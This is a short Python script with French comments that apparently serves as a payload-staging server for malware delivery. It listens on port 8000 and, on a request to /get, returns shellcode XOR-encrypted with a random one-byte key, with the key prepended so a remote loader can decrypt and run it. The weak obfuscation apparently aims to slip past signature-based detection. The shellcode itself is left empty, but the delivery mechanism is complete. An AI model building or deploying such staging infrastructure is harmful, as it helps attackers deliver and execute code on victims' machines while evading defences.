# -*- coding: utf-8 -*-
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import os

# Shellcode à chiffrer
SHELLCODE = b""

def encrypt_shellcode(key: bytes) -> bytes:
    # Chiffre le shellcode avec une clé donnée.
    return bytes([byte ^ key[0] for byte in SHELLCODE])

class MyHandler(BaseHTTPRequestHandler):
    def extract_path(self) -> str:
        parsed = urlparse(self.path)
        query_string = parsed.query
        return parsed.path

    def return_404(self):
        self.send_response(404, message="Not Found")
        self.end_headers()
    
    def return_shellcode(self):
       # Générer une clé aléatoire (1 octet)
        encryption_key = os.urandom(1)
        
        # Chiffrer le shellcode
        encrypted_shellcode = encrypt_shellcode(encryption_key)
        
        # Construire la réponse contenant la clé et le shellcode chiffré
        response = encryption_key + encrypted_shellcode

        # Envoyer la réponse
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    def do_GET(self):
        path = self.extract_path()
        if path != "/get":
            self.return_404()
        else:
            self.return_shellcode()

httpd = HTTPServer(('0.0.0.0', 8000), MyHandler)
httpd.serve_forever()
